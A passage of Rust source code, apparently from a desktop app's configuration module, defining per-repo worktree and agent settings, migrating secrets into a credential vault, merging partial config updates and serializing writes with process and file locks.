    pub(crate) worktree_storage: Option<WorktreeStorage>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) delete_branch_on_remove: Option<bool>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) auto_archive_merged: Option<bool>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) orphan_cleanup: Option<OrphanCleanup>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) pr_merge_strategy: Option<MergeStrategy>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) after_merge: Option<WorktreeAfterMerge>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) auto_delete_on_pr_close: Option<AutoDeleteOnPrClose>,
    /// Allowlist of upstream MCP server names relevant to this repo (None = all)
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) mcp_upstreams: Option<Vec<String>>,
}

const REPO_LOCAL_CONFIG_FILE: &str = ".tuic.json";

/// Load `.tuic.json` from a repository root.
/// Returns `None` if the file doesn't exist or is malformed.
pub(crate) fn load_repo_local_config_from_path(
    repo_path: &std::path::Path,
) -> Option<RepoLocalConfig> {
    let path = repo_path.join(REPO_LOCAL_CONFIG_FILE);
    match std::fs::read_to_string(&path) {
        Ok(contents) => match serde_json::from_str::<RepoLocalConfig>(&contents) {
            Ok(config) => Some(config),
            Err(e) => {
                tracing::warn!(path = %path.display(), "Malformed config: {e}");
                None
            }
        },
        Err(_) => None,
    }
}

// ---------------------------------------------------------------------------
// RepoSettingsMap — per-repo settings keyed by repo path
// ---------------------------------------------------------------------------

#[derive(Clone, Default, Serialize, Deserialize)]
pub(crate) struct RepoSettingsEntry {
    pub(crate) path: String,
    #[serde(default)]
    pub(crate) display_name: String,
    /// null = inherit from global repo defaults
    #[serde(default)]
    pub(crate) base_branch: Option<String>,
    /// null = inherit from global repo defaults
    #[serde(default)]
    pub(crate) copy_ignored_files: Option<bool>,
    /// null = inherit from global repo defaults
    #[serde(default)]
    pub(crate) copy_untracked_files: Option<bool>,
    /// null = inherit from global repo defaults
    #[serde(default)]
    pub(crate) setup_script: Option<String>,
    /// null = inherit from global repo defaults
    #[serde(default)]
    pub(crate) run_script: Option<String>,
    /// null = inherit from global repo defaults
    #[serde(default)]
    pub(crate) archive_script: Option<String>,
    #[serde(default)]
    pub(crate) color: String,
    // -- Worktree settings (null = inherit from global) --
    #[serde(default)]
    pub(crate) worktree_storage: Option<WorktreeStorage>,
    #[serde(default)]
    pub(crate) prompt_on_create: Option<bool>,
    #[serde(default)]
    pub(crate) prompt_on_worktree_switch: Option<bool>,
    #[serde(default)]
    pub(crate) delete_branch_on_remove: Option<bool>,
    #[serde(default)]
    pub(crate) auto_archive_merged: Option<bool>,
    #[serde(default)]
    pub(crate) orphan_cleanup: Option<OrphanCleanup>,
    #[serde(default)]
    pub(crate) pr_merge_strategy: Option<MergeStrategy>,
    #[serde(default)]
    pub(crate) after_merge: Option<WorktreeAfterMerge>,
    /// Auto-fetch interval in minutes (0 or None = disabled)
    #[serde(default)]
    pub(crate) auto_fetch_interval_minutes: Option<u32>,
    /// Auto-delete local branch when PR is merged/closed
    #[serde(default)]
    pub(crate) auto_delete_on_pr_close: Option<AutoDeleteOnPrClose>,
    /// Allowlist of upstream MCP server names relevant to this repo (None = all)
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) mcp_upstreams: Option<Vec<String>>,
    /// Human-readable labels for branches/worktrees, keyed by branch name
    #[serde(default, skip_serializing_if = "HashMap::is_empty")]
    pub(crate) branch_labels: HashMap<String, String>,
    /// Gather every worktree of this repo into one consolidated screen (#e767).
    /// Repo-specific, not inheritable: it describes how you want to look at THIS
    /// repo, and a global default would consolidate repos you never asked about.
    #[serde(default)]
    pub(crate) auto_consolidate_worktrees: bool,
}

impl RepoSettingsEntry {
    /// Check if this entry has any non-default settings
    pub(crate) fn has_custom_settings(&self) -> bool {
        self.base_branch.is_some()
            || self.copy_ignored_files.is_some()
            || self.copy_untracked_files.is_some()
            || self.setup_script.is_some()
            || self.run_script.is_some()
            || self.archive_script.is_some()
            || !self.color.is_empty()
            || self.worktree_storage.is_some()
            || self.prompt_on_create.is_some()
            || self.prompt_on_worktree_switch.is_some()
            || self.delete_branch_on_remove.is_some()
            || self.auto_archive_merged.is_some()
            || self.orphan_cleanup.is_some()
            || self.pr_merge_strategy.is_some()
            || self.after_merge.is_some()
            || self.auto_fetch_interval_minutes.is_some()
            || self.auto_delete_on_pr_close.is_some()
            || self.mcp_upstreams.is_some()
            || !self.branch_labels.is_empty()
            || self.auto_consolidate_worktrees
    }
}

/// Global defaults applied to all repos unless overridden per-repo
#[derive(Clone, Serialize, Deserialize)]
pub(crate) struct RepoDefaultsConfig {
    #[serde(default = "default_base_branch")]
    pub(crate) base_branch: String,
    #[serde(default)]
    pub(crate) copy_ignored_files: bool,
    #[serde(default)]
    pub(crate) copy_untracked_files: bool,
    #[serde(default)]
    pub(crate) setup_script: String,
    #[serde(default)]
    pub(crate) run_script: String,
    #[serde(default)]
    pub(crate) archive_script: String,
    // -- Worktree settings --
    #[serde(default)]
    pub(crate) worktree_storage: WorktreeStorage,
    #[serde(default = "default_true")]
    pub(crate) prompt_on_create: bool,
    /// Ask whether to switch to a worktree the backend just created
    #[serde(default = "default_true")]
    pub(crate) prompt_on_worktree_switch: bool,
    #[serde(default = "default_true")]
    pub(crate) delete_branch_on_remove: bool,
    #[serde(default)]
    pub(crate) auto_archive_merged: bool,
    #[serde(default)]
    pub(crate) orphan_cleanup: OrphanCleanup,
    #[serde(default)]
    pub(crate) pr_merge_strategy: MergeStrategy,
    #[serde(default)]
    pub(crate) after_merge: WorktreeAfterMerge,
    /// Auto-fetch interval in minutes (0 = disabled)
    #[serde(default)]
    pub(crate) auto_fetch_interval_minutes: u32,
    /// Auto-delete local branch when PR is merged/closed
    #[serde(default)]
    pub(crate) auto_delete_on_pr_close: AutoDeleteOnPrClose,
}

impl Default for RepoDefaultsConfig {
    fn default() -> Self {
        Self {
            base_branch: default_base_branch(),
            copy_ignored_files: false,
            copy_untracked_files: false,
            setup_script: String::new(),
            run_script: String::new(),
            archive_script: String::new(),
            worktree_storage: WorktreeStorage::default(),
            prompt_on_create: true,
            prompt_on_worktree_switch: true,
            delete_branch_on_remove: true,
            auto_archive_merged: false,
            orphan_cleanup: OrphanCleanup::default(),
            pr_merge_strategy: MergeStrategy::default(),
            after_merge: WorktreeAfterMerge::default(),
            auto_fetch_interval_minutes: 0,
            auto_delete_on_pr_close: AutoDeleteOnPrClose::default(),
        }
    }
}

fn default_base_branch() -> String {
    "automatic".to_string()
}

/// Map of repo path -> settings
#[derive(Clone, Serialize, Deserialize, Default)]
pub(crate) struct RepoSettingsMap {
    #[serde(default)]
    pub(crate) repos: HashMap<String, RepoSettingsEntry>,
}

// ---------------------------------------------------------------------------
// PromptLibraryConfig
// ---------------------------------------------------------------------------

#[derive(Clone, Serialize, Deserialize, Default)]
pub(crate) struct PromptEntry {
    pub(crate) id: String,
    #[serde(default)]
    pub(crate) label: String,
    #[serde(default)]
    pub(crate) text: String,
    #[serde(default)]
    pub(crate) pinned: bool,
}

#[derive(Clone, Serialize, Deserialize, Default)]
pub(crate) struct PromptLibraryConfig {
    #[serde(default)]
    pub(crate) prompts: Vec<PromptEntry>,
}

// ---------------------------------------------------------------------------
// AiPromptsConfig — customizable system prompts for internal AI services
// ---------------------------------------------------------------------------

#[derive(Clone, Serialize, Deserialize, Default)]
pub(crate) struct AiPromptsConfig {
    #[serde(default)]
    pub(crate) diff_triage_system_prompt: Option<String>,
}

// ---------------------------------------------------------------------------
// AgentsConfig — per-agent run configurations
// ---------------------------------------------------------------------------

#[derive(Clone, Serialize, Deserialize)]
pub(crate) struct AgentRunConfig {
    pub(crate) name: String,
    pub(crate) command: String,
    #[serde(default)]
    pub(crate) args: Vec<String>,
    #[serde(default)]
    pub(crate) env: HashMap<String, String>,
    #[serde(default)]
    pub(crate) is_default: bool,
}

#[derive(Clone, Serialize, Deserialize, Default)]
pub(crate) struct AgentSettings {
    #[serde(default)]
    pub(crate) run_configs: Vec<AgentRunConfig>,
    /// Automatically retry on server errors (5xx) by injecting "continue" into the session.
    /// Retries up to 3 times with exponential backoff (5s, 15s, 30s).
    #[serde(default)]
    pub(crate) auto_retry_on_error: bool,
    /// Shell command template for headless (one-shot) prompt execution.
    /// Placeholders like `{prompt}` are replaced before invocation.
    #[serde(default)]
    pub(crate) headless_template: Option<String>,
    /// Environment feature flags — key→value pairs injected into every spawn of this agent.
    #[serde(default, skip_serializing_if = "HashMap::is_empty")]
    pub(crate) env_flags: HashMap<String, String>,
    /// Per-agent override for intent tab title. None = use agent-aware default.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) intent_tab_title: Option<bool>,
    /// Per-agent override for suggested follow-ups. None = use global default.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) suggest_followups: Option<bool>,
    /// Opt-in: drive busy/idle/awaiting from the agent's native hooks instead of
    /// output heuristics. Enabling installs hooks into the agent's settings file;
    /// disabling removes only TUIC's entries. None/false = heuristics (default).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) hook_instrumentation: Option<bool>,
}

#[derive(Clone, Serialize, Deserialize, Default)]
pub(crate) struct AgentsConfig {
    #[serde(default)]
    pub(crate) agents: HashMap<String, AgentSettings>,
    /// Which agent CLI to use for headless (one-shot) prompt execution when no
    /// agent is running in the active terminal. Chosen by the user in Settings.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) headless_agent: Option<String>,
}

// ---------------------------------------------------------------------------
// Tauri commands — one load/save pair per config type
// ---------------------------------------------------------------------------

const APP_CONFIG_FILE: &str = "config.json";
const NOTIFICATION_CONFIG_FILE: &str = "notifications.json";
const UI_PREFS_FILE: &str = "ui-prefs.json";
const REPO_SETTINGS_FILE: &str = "repo-settings.json";
const REPO_DEFAULTS_FILE: &str = "repo-defaults.json";
const PROMPT_LIBRARY_FILE: &str = "prompt-library.json";
const REPOSITORIES_FILE: &str = "repositories.json";
const NOTES_FILE: &str = "notes.json";
const KEYBINDINGS_FILE: &str = "keybindings.json";
const PANE_LAYOUT_FILE: &str = "pane-layout.json";
const AGENTS_CONFIG_FILE: &str = "agents.json";
const ACTIVITY_FILE: &str = "activity.json";
const AI_PROMPTS_FILE: &str = "ai-prompts.json";

// App config

/// Migrate flat service fields from pre-ServicesConfig format into nested `services` object.
fn migrate_flat_services(val: &mut serde_json::Value) {
    let obj = match val.as_object_mut() {
        Some(o) => o,
        None => return,
    };
    if obj.contains_key("services") {
        return;
    }
    // Only migrate if any flat field exists
    let flat_keys = [
        "remote_access_enabled",
        "remote_access_port",
        "remote_access_username",
        "remote_access_password_hash",
        "session_token",
        "session_token_duration_secs",
        "ipv6_enabled",
        "lan_auth_bypass",
        "relay_enabled",
        "relay_url",
        "relay_token",
        "relay_session_id",
        "push_enabled",
        "vapid_private_key",
        "vapid_public_key",
        "vapid_subject",
    ];
    if !flat_keys.iter().any(|k| obj.contains_key(*k)) {
        return;
    }

    let take = |obj: &mut serde_json::Map<String, serde_json::Value>, key: &str| {
        obj.remove(key).unwrap_or(serde_json::Value::Null)
    };

    let server = serde_json::json!({
        "enabled": take(obj, "remote_access_enabled"),
        "port": take(obj, "remote_access_port"),
        "ipv6_enabled": take(obj, "ipv6_enabled"),
    });
    let auth = serde_json::json!({
        "username": take(obj, "remote_access_username"),
        "password_hash": take(obj, "remote_access_password_hash"),
        "session_token": take(obj, "session_token"),
        "session_token_duration_secs": take(obj, "session_token_duration_secs"),
        "lan_auth_bypass": take(obj, "lan_auth_bypass"),
    });
    let relay = serde_json::json!({
        "enabled": take(obj, "relay_enabled"),
        "url": take(obj, "relay_url"),
        "token": take(obj, "relay_token"),
        "session_id": take(obj, "relay_session_id"),
    });
    let push = serde_json::json!({
        "enabled": take(obj, "push_enabled"),
        "vapid_private_key": take(obj, "vapid_private_key"),
        "vapid_public_key": take(obj, "vapid_public_key"),
        "vapid_subject": take(obj, "vapid_subject"),
    });

    obj.insert(
        "services".to_string(),
        serde_json::json!({
            "server": server,
            "auth": auth,
            "tls": { "mode": "off" },
            "relay": relay,
            "push": push,
        }),
    );
}

/// Read one secret from the credential vault.
///
/// `Ok(None)` means the vault answered and the secret genuinely is not there.
/// `Err` means the vault could not be consulted at all. Callers MUST keep those apart:
/// collapsing a failure into "absent" is how a valid secret gets deleted — see
/// [`hydrate_one_secret`].
fn read_secret(cred: crate::credentials::Credential<'_>) -> Result<Option<String>, String> {
    crate::credentials::get(cred)
}

/// What happened while hydrating one secret.
struct SecretHydration {
    /// The `*_exists` flag to record in the config.
    exists: bool,
    /// A plaintext secret was found in config.json and pushed into the vault, so the
    /// config must be rewritten to strip it from disk.
    migrated: bool,
}

/// Load one secret into `plaintext`, or migrate it into the vault if it is still
/// sitting in config.json.
///
/// `previous_exists` is what config.json last claimed. On a vault **read failure** it is
/// kept rather than reset to `false`, and that is the whole point of this function:
///
/// A transient keychain error used to be indistinguishable from "no secret". The flag
/// went to `false`, which made `preserve_redacted_app_config_secrets` skip the field
/// (it only preserves what it believes exists), so the next save reached
/// `persist_secret` with an empty value and `exists == false` — the one branch that
/// calls `credentials::delete`. A locked keychain for one second therefore destroyed a
/// working session token permanently. Keeping the flag makes that branch unreachable:
/// `persist_secret` returns early on `exists == true` without touching the vault.
fn hydrate_one_secret(
    cred: crate::credentials::Credential<'_>,
    plaintext: &mut String,
    previous_exists: bool,
    label: &str,
) -> SecretHydration {
    if !plaintext.is_empty() {
        // Plaintext left over from before the vault existed: move it in and tell the
        // caller to rewrite config.json, otherwise the cleartext copy lingers forever.
        match crate::credentials::set(cred, plaintext) {
            Ok(()) => {
                return SecretHydration {
                    exists: true,
                    migrated: true,
                };
            }
            Err(e) => {
                tracing::warn!(source = "config", "Failed to migrate {label} to vault: {e}");
                // Migration failed — the plaintext is all we have, so keep serving it and
                // do NOT rewrite the file, or the only copy would be erased.
                return SecretHydration {
                    exists: true,
                    migrated: false,
                };
            }
        }
    }

    match read_secret(cred) {
        Ok(Some(value)) => {
            *plaintext = value;
            SecretHydration {
                exists: true,
                migrated: false,
            }
        }
        Ok(None) => SecretHydration {
            exists: false,
            migrated: false,
        },
        Err(e) => {
            tracing::warn!(
                source = "config",
                "Could not read {label} from the credential vault: {e}. \
                 Keeping the recorded presence flag so the secret is not deleted."
            );
            SecretHydration {
                exists: previous_exists,
                migrated: false,
            }
        }
    }
}

/// Hydrate every vault-backed secret. Returns `true` when plaintext was migrated out of
/// config.json and the file must be rewritten.
#[must_use]
fn hydrate_app_config_secrets(config: &mut AppConfig) -> bool {
    let session = hydrate_one_secret(
        crate::credentials::Credential::RemoteSessionToken,
        &mut config.services.auth.session_token,
        config.services.auth.session_token_exists,
        "session token",
    );
    config.services.auth.session_token_exists = session.exists;

    let relay = hydrate_one_secret(
        crate::credentials::Credential::RelayToken,
        &mut config.services.relay.token,
        config.services.relay.token_exists.unwrap_or(false),
        "relay token",
    );
    config.services.relay.token_exists = Some(relay.exists);

    let push = hydrate_one_secret(
        crate::credentials::Credential::PushVapidPrivateKey,
        &mut config.services.push.vapid_private_key,
        config.services.push.vapid_private_key_exists,
        "VAPID private key",
    );
    config.services.push.vapid_private_key_exists = push.exists;

    session.migrated || relay.migrated || push.migrated
}

fn persist_secret(
    cred: crate::credentials::Credential<'_>,
    value: &str,
    exists: bool,
) -> Result<bool, String> {
    if !value.is_empty() {
        crate::credentials::set(cred, value)?;
        Ok(true)
    } else if exists {
        Ok(true)
    } else {
        crate::credentials::delete(cred)?;
        Ok(false)
    }
}

#[derive(Clone)]
struct AppSecretSnapshot {
    session_token: Option<String>,
    relay_token: Option<String>,
    vapid_private_key: Option<String>,
}

impl AppSecretSnapshot {
    fn capture() -> Result<Self, String> {
        Ok(Self {
            session_token: read_secret(crate::credentials::Credential::RemoteSessionToken)?,
            relay_token: read_secret(crate::credentials::Credential::RelayToken)?,
            vapid_private_key: read_secret(crate::credentials::Credential::PushVapidPrivateKey)?,
        })
    }

    fn restore(self) -> Result<(), String> {
        fn restore_one(
            cred: crate::credentials::Credential<'_>,
            value: Option<String>,
        ) -> Result<(), String> {
            match value {
                Some(value) => crate::credentials::set(cred, &value),
                None => crate::credentials::delete(cred),
            }
        }

        let mut errors = Vec::new();
        for (label, result) in [
            (
                "session token",
                restore_one(
                    crate::credentials::Credential::RemoteSessionToken,
                    self.session_token,
                ),
            ),
            (
                "relay token",
                restore_one(crate::credentials::Credential::RelayToken, self.relay_token),
            ),
            (
                "VAPID private key",
                restore_one(
                    crate::credentials::Credential::PushVapidPrivateKey,
                    self.vapid_private_key,
                ),
            ),
        ] {
            if let Err(error) = result {
                errors.push(format!("{label}: {error}"));
            }
        }
        if errors.is_empty() {
            Ok(())
        } else {
            Err(errors.join("; "))
        }
    }
}

fn config_for_disk(mut config: AppConfig) -> Result<AppConfig, String> {
    config.services.auth.session_token_exists = persist_secret(
        crate::credentials::Credential::RemoteSessionToken,
        &config.services.auth.session_token,
        config.services.auth.session_token_exists,
    )?;
    config.services.auth.session_token.clear();

    config.services.relay.token_exists = Some(persist_secret(
        crate::credentials::Credential::RelayToken,
        &config.services.relay.token,
        // `None` (never resolved by preserve_redacted_app_config_secrets) is
        // treated as "not known to exist" — matches the prior `bool` default.
        config.services.relay.token_exists.unwrap_or(false),
    )?);
    config.services.relay.token.clear();

    config.services.push.vapid_private_key_exists = persist_secret(
        crate::credentials::Credential::PushVapidPrivateKey,
        &config.services.push.vapid_private_key,
        config.services.push.vapid_private_key_exists,
    )?;
    config.services.push.vapid_private_key.clear();

    Ok(config)
}

pub(crate) fn preserve_redacted_app_config_secrets(config: &mut AppConfig, current: &AppConfig) {
    if config.services.auth.session_token.is_empty() && current.services.auth.session_token_exists {
        config.services.auth.session_token = current.services.auth.session_token.clone();
        config.services.auth.session_token_exists = true;
    }
    // DATA-1: `token_exists` is `Option<bool>` for relay specifically so we can tell
    // "caller omitted this field" (None — preserve) apart from "caller explicitly
    // cleared it" (Some(false) — honor the clear, matches ServicesTab.tsx's
    // `token_exists = v.length > 0` on the bearer-token input). A partial payload
    // (agent MCP `config/save`, partial PUT /config) that simply doesn't mention
    // relay.token_exists must NOT be treated the same as an explicit clear.
    if config.services.relay.token.is_empty()
        && config.services.relay.token_exists != Some(false)
        && current.services.relay.token_exists.unwrap_or(false)
    {
        config.services.relay.token = current.services.relay.token.clone();
        config.services.relay.token_exists = Some(true);
    }
    if config.services.push.vapid_private_key.is_empty()
        && current.services.push.vapid_private_key_exists
    {
        config.services.push.vapid_private_key = current.services.push.vapid_private_key.clone();
        config.services.push.vapid_private_key_exists = true;
    }
}

/// Deep-merge a possibly-partial config payload onto the current config.
///
/// `PUT /config` and the MCP `config` tool advertise "config fields to save",
/// but both used to deserialize the body straight into an `AppConfig`. Every
/// omitted field then fell back to its serde default — and `ServerConfig`
/// defaults `enabled` to `false`, so a partial save silently switched remote
/// access off on disk while the already-bound listener kept serving. The
/// divergence only surfaced at the next boot, as "it was listening when I quit
/// and dead when it came back". Merging onto the current snapshot keeps every
/// unmentioned field intact.
///
/// Objects merge key by key; arrays and scalars replace wholesale, so a caller
/// can still clear a list by sending an empty one or blank a string by sending
/// `""`.
pub(crate) fn merge_partial_app_config(
    current: &AppConfig,
    incoming: serde_json::Value,
) -> Result<AppConfig, String> {
    let mut merged =
        serde_json::to_value(current).map_err(|e| format!("Could not snapshot config: {e}"))?;
    merge_json_value(&mut merged, incoming);
    serde_json::from_value(merged).map_err(|e| format!("Invalid config: {e}"))
}

pub(crate) fn merge_json_value(base: &mut serde_json::Value, incoming: serde_json::Value) {
    match (base, incoming) {
        (serde_json::Value::Object(base_map), serde_json::Value::Object(incoming_map)) => {
            for (key, value) in incoming_map {
                merge_json_value(
                    base_map.entry(key).or_insert(serde_json::Value::Null),
                    value,
                );
            }
        }
        (base, incoming) => *base = incoming,
    }
}

/// Return the JSON merge delta that turns `base` into `desired`.
///
/// An omitted object key means "unchanged". A `null` value is an intentional
/// clear, including when a `skip_serializing_if = "Option::is_none"` field was
/// present in `base` and absent from `desired`. Arrays are values rather than
/// maps here, so a changed array replaces the previous array wholesale.
pub(crate) fn json_merge_delta(
    base: &serde_json::Value,
    desired: &serde_json::Value,
) -> Option<serde_json::Value> {
    match (base, desired) {
        (serde_json::Value::Object(base_map), serde_json::Value::Object(desired_map)) => {
            let mut delta = serde_json::Map::new();
            for (key, desired_value) in desired_map {
                match base_map.get(key) {
                    Some(base_value) => {
                        if let Some(value_delta) = json_merge_delta(base_value, desired_value) {
                            delta.insert(key.clone(), value_delta);
                        }
                    }
                    None => {
                        delta.insert(key.clone(), desired_value.clone());
                    }
                }
            }
            for key in base_map.keys() {
                if !desired_map.contains_key(key) {
                    delta.insert(key.clone(), serde_json::Value::Null);
                }
            }
            (!delta.is_empty()).then_some(serde_json::Value::Object(delta))
        }
        _ if base == desired => None,
        _ => Some(desired.clone()),
    }
}

fn app_config_delta(base: &AppConfig, desired: &AppConfig) -> Result<serde_json::Value, String> {
    let base =
        serde_json::to_value(base).map_err(|e| format!("Could not serialize base config: {e}"))?;
    let desired = serde_json::to_value(desired)
        .map_err(|e| format!("Could not serialize requested config: {e}"))?;
    Ok(json_merge_delta(&base, &desired)
        .unwrap_or_else(|| serde_json::Value::Object(serde_json::Map::new())))
}

/// The remote-access settings whose change requires an HTTP server restart.
/// Shared by every config writer (IPC `save_config`, `PUT /config`, MCP
/// `config` save) so the transports cannot drift on when to rebind.
pub(crate) fn server_settings_changed(old: &AppConfig, new: &AppConfig) -> bool {
    old.services.server.enabled != new.services.server.enabled
        || old.services.server.port != new.services.server.port
        || old.services.server.ipv6_enabled != new.services.server.ipv6_enabled
        || old.services.auth.username != new.services.auth.username
        || old.services.auth.password_hash != new.services.auth.password_hash
}

/// Serializes every read-modify-write-persist of the app config.
///
/// The three writers (IPC `save_config`, `PUT /config`, MCP `config action=save`) plus
/// token rotation all did: read `state.config`, merge, write the file, store back. With
/// no lock, two overlapping saves both read the same snapshot and the second overwrote
/// the first — a classic lost update, and one of the two was often a security-relevant
/// field. `parking_lot` rather than `std`: a panic while holding this must not poison the
/// mutex and wedge every later config write.
static CONFIG_WRITE_LOCK: parking_lot::Mutex<()> = parking_lot::Mutex::new(());

/// Proof of holding `CONFIG_WRITE_LOCK`, required by `write_holding_lock` so its "caller
/// MUST already hold the lock" precondition is a compile error to violate, not just a
/// doc comment a future caller can miss.
struct ConfigWriteGuard(#[allow(dead_code)] parking_lot::MutexGuard<'static, ()>);

fn config_write_lock() -> ConfigWriteGuard {
    ConfigWriteGuard(CONFIG_WRITE_LOCK.lock())
}

/// Test-only: widens `load_app_config`'s read-to-write window so a concurrent writer
/// reliably lands inside it. Read from an env var rather than a `#[cfg(test)]` static
/// (the credentials.rs fault-injection pattern) because the two sides of the
/// `two_process_*` race tests below run in SEPARATE OS PROCESSES, which do not share
/// statics — only the environment carries across `std::process::Command::spawn`.
#[cfg(test)]
fn test_load_app_config_delay() {
    if let Ok(ms) = std::env::var("TUIC_TEST_LOAD_APP_CONFIG_DELAY_MS")
        && let Ok(ms) = ms.parse::<u64>()
    {
        std::thread::sleep(std::time::Duration::from_millis(ms));
    }
}

/// A cross-process-safe on-disk config file.
///
/// Two independent locks protect every write:
/// - `CONFIG_WRITE_LOCK` (in-process, `parking_lot::Mutex`) serializes writers within
///   this process, same as before this type existed.
/// - An advisory OS file lock (`std::fs::File::lock()`, stable since Rust 1.89; backed by
///   `flock(2)`/`LockFileEx`) serializes writers ACROSS
///   processes — the actual bug this type exists to fix: a debug and a release build
///   sharing one config directory each load a file, one saves, the other saves its now
///   stale whole-file copy on top, silently discarding the first write. A mutex alone
///   cannot fix this: it only serializes two writes that still clobber each other.
///
/// Lock order is always in-process THEN file lock, and the file lock is acquired at
/// most once per call — re-entering it from the same process would block against its
/// own earlier lock (advisory locks are tied to the open file description, not the
/// process/thread), not no-op like a reentrant mutex would. `write_holding_lock` exists
/// for explicit whole-document writes that already hold `CONFIG_WRITE_LOCK`.
pub(crate) struct ConfigFile<T> {
    path: PathBuf,
    _marker: std::marker::PhantomData<T>,
}

impl<T> ConfigFile<T>
where
    T: Serialize + DeserializeOwned + Default,
{
    pub(crate) fn new(filename: &str) -> Self {
        Self::at_path(config_dir().join(filename))
    }

    /// Construct for a file at an arbitrary path outside `config_dir()`.
    pub(crate) fn at_path(path: PathBuf) -> Self {
        Self {
            path,
            _marker: std::marker::PhantomData,
        }
    }

    fn lock_path(&self) -> PathBuf {
        let mut name = self.path.clone().into_os_string();
        name.push(".lock");
        PathBuf::from(name)
    }

    /// Open (creating if needed) and blockingly acquire the cross-process advisory
    /// lock. The returned handle releases the lock on drop.
    fn acquire_file_lock(&self) -> Result<std::fs::File, String> {
        if let Some(dir) = self.path.parent() {
            std::fs::create_dir_all(dir).map_err(|e| format!("Failed to create directory: {e}"))?;
        }
        let file = std::fs::OpenOptions::new()
            .create(true)
            .write(true)
            .truncate(false)
            .open(self.lock_path())
            .map_err(|e| format!("Failed to open config lock file: {e}"))?;
        file.lock()
            .map_err(|e| format!("Failed to acquire config file lock: {e}"))?;
        Ok(file)
    }

    /// No locking of its own — callers must already hold whichever locks apply.
    fn write_atomic(&self, value: &T) -> Result<(), String> {
        let json = serde_json::to_string_pretty(value).map_err(|e| e.to_string())?;
        persist_atomic(&self.path, json.as_bytes())
    }

    /// Read-modify-write under both locks. `mutate` receives a value freshly re-read
    /// from disk *inside* the file lock — any value the caller loaded earlier is
    /// discarded — so the closure always mutates the latest on-disk state, never a
    /// stale snapshot. Return `false` from `mutate` to skip the write entirely (for
    /// callers with an existing no-op path, e.g. removing a label that isn't set,
    /// which must not touch the file or its mtime).
    pub(crate) fn update<F>(&self, mutate: F) -> Result<(), String>
    where
        F: FnOnce(&mut T) -> bool,
    {
        self.update_with(|value| Ok(((), mutate(value))))
    }

    /// Read-modify-write under both locks and return a value derived from the exact
    /// pre/post state. A fallible mutation aborts before persistence; `changed = false`
    /// returns the result without touching the file.
    pub(crate) fn update_with<R, F>(&self, mutate: F) -> Result<R, String>
    where
        F: FnOnce(&mut T) -> Result<(R, bool), String>,
    {
        let _guard = CONFIG_WRITE_LOCK.lock();
        let _file_lock = self.acquire_file_lock()?;
        let mut value = load_json_config_from_path(&self.path);
        let (result, changed) = mutate(&mut value)?;
        if changed {
            self.write_atomic(&value)?;
        }
        Ok(result)
    }

    /// Strict variant for domains where treating corrupt input as `Default` would turn
    /// a recovery condition into data loss. Missing files still start from `Default`;
    /// unreadable or invalid files abort before the mutation runs.
    pub(crate) fn update_with_strict<R, F>(&self, mutate: F) -> Result<R, String>
    where
        F: FnOnce(&mut T) -> Result<(R, bool), String>,
    {
        let _guard = CONFIG_WRITE_LOCK.lock();
        let _file_lock = self.acquire_file_lock()?;
        let mut value = load_json_config_strict_from_path(&self.path)?;
        let (result, changed) = mutate(&mut value)?;
        if changed {
            self.write_atomic(&value)?;
        }
        Ok(result)
    }

    /// Write `value` unconditionally, taking only the cross-process file lock — no
    /// stamp check. Takes only the file lock itself, not `CONFIG_WRITE_LOCK`: the
    /// `&ConfigWriteGuard` parameter proves the caller already holds it, which is what
    /// makes skipping it here safe. Re-acquiring it from inside this call would deadlock
    /// (`parking_lot::Mutex` is not reentrant). Callers use this only when complete
    /// document replacement is the intended operation.
    fn write_holding_lock(&self, _guard: &ConfigWriteGuard, value: &T) -> Result<(), String> {
        let _file_lock = self.acquire_file_lock()?;
        self.write_atomic(value)
    }

    /// Write `value` unconditionally under both locks — the "plain locked write" for
    /// callers replacing a whole document, as opposed to `update()`'s read-modify-write.
    pub(crate) fn save(&self, value: &T) -> Result<(), String> {
        let guard = config_write_lock();
        self.write_holding_lock(&guard, value)
    }
}

/// Side effects the caller must action after a successful config write.
#[derive(Debug)]
pub(crate) struct ConfigSaveEffects {
    /// `disabled_native_tools` or `collapse_tools` moved — notify MCP clients.
    pub tools_changed: bool,
    /// A listener-affecting field moved — rebind the HTTP server.
    pub server_changed: bool,
}

/// Atomically apply a change to the app config.
///
/// `mutate` is handed this process's current cached config and returns the desired
/// value. Only the cached-to-desired delta is then applied to a fresh on-disk config
/// while the cross-process file lock is held. A second process may therefore have
/// changed unrelated fields since this process loaded its cache without those changes
/// being overwritten by a stale whole-document save. Redacted secrets are preserved,
/// the file is written, and `state.config` is refreshed from the merged value — all
/// inside the same critical section.
///
/// Synchronous on purpose: the body does blocking disk I/O, so async callers must reach
/// it through `spawn_blocking` rather than holding an async task across the write.
pub(crate) fn commit_config_change<F>(
    state: &crate::AppState,
    mutate: F,
) -> Result<ConfigSaveEffects, String>
where
    F: FnOnce(&AppConfig) -> Result<AppConfig, String>,
{
    let _guard = config_write_lock();

    let cached = state.config.read().clone();
    let mut requested = mutate(&cached)?;
    preserve_redacted_app_config_secrets(&mut requested, &cached);
    let delta = app_config_delta(&cached, &requested)?;

    let file = ConfigFile::<AppConfig>::new(APP_CONFIG_FILE);
    let _file_lock = file.acquire_file_lock()?;
    let file_exists = file.path.exists();
    let (latest, _) = read_app_config_unlocked(&file.path)?;
    // A process may hold generated first-run values before config.json exists.
    // There is no competing persisted document in that case, so use the cache as
    // the base rather than dropping those values back to AppConfig::default().
    let latest = if file_exists { latest } else { cached.clone() };
    let next = merge_partial_app_config(&latest, delta)?;

    let effects = ConfigSaveEffects {
        tools_changed: cached.disabled_native_tools != next.disabled_native_tools
            || cached.collapse_tools != next.collapse_tools,
        server_changed: server_settings_changed(&cached, &next),
    };

    // The file lock is already held from the authoritative read above. Acquiring it
    // again through save_app_config_locked would self-deadlock.
